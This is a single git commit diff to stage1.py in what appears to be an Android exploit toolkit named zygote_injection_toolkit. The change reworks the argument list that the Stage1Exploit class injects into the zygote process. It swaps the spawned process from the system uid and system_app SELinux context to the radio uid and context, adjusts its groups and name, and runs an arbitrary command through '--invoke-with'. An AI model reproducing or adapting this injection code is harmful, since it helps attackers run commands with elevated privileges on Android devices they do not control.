a129007ff9aef4403336dfc5db06754e649b1131
コアラ <189215038+coara-chocomaru@users.noreply.github.com>
2026-08-25 18:58:21 +0900

    Update stage1.py

--- zygote_injection_toolkit/stage1.py
+++ zygote_injection_toolkit/stage1.py
@@ -189,16 +189,13 @@ class Stage1Exploit:
         assert "," not in command
         # TODO let you specify the SELinux context through command line arguments
         raw_zygote_arguments = [
-            "--setuid=1000",
-            "--setgid=1000",
-            "--setgroups=3003",
-            "--mount-external-read",
-            "--mount-external-write",
+            "--setuid=1001",
+            "--setgid=1001",
+            "--setgroups=3003,1015",
             "--runtime-args",
-            "--seinfo=platform:system_app:complete",
+            "--seinfo=platform:radio:complete",
             "--runtime-flags=1",
-            "--nice-name=runmenetcat",
-            "--setgroups=1065",
+            "--nice-name=radio",
             "--invoke-with",
             f"{command}#",
         ]
